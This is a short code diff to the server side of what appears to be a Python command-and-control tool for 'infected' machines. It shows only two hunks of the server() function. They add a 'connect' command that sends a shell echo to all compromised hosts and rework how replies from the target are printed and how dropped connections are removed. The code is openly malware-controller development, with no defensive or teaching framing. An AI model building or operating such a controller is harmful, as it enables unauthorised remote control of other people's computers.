@@ -46,7 +46,8 @@ def server():
                         case "list":
                             for infected in dict_ip:
                                 print(f"{infected}: {dict_ip[infected]}")
-                    
+                        case "connect":
+                            send_message("echo i'm connected", dict_ip)
                     
                     
                     
@@ -62,12 +63,10 @@ def server():
                         break
                         
                 new_data = elem.recv(4096).decode('cp850', errors='replace').strip()
-                if new_data and not ">" in new_data:
-                    
-                    
+                if ">" in new_data:
+                    print("")
+                elif new_data:
                     print(f"\n[answer from {nom_cible}] :\n {new_data}")
-                elif ">" in new_data:
-                    pass
                 else:
                     print(f"connection lost with {nom_cible}")
                     server_list.remove(elem)
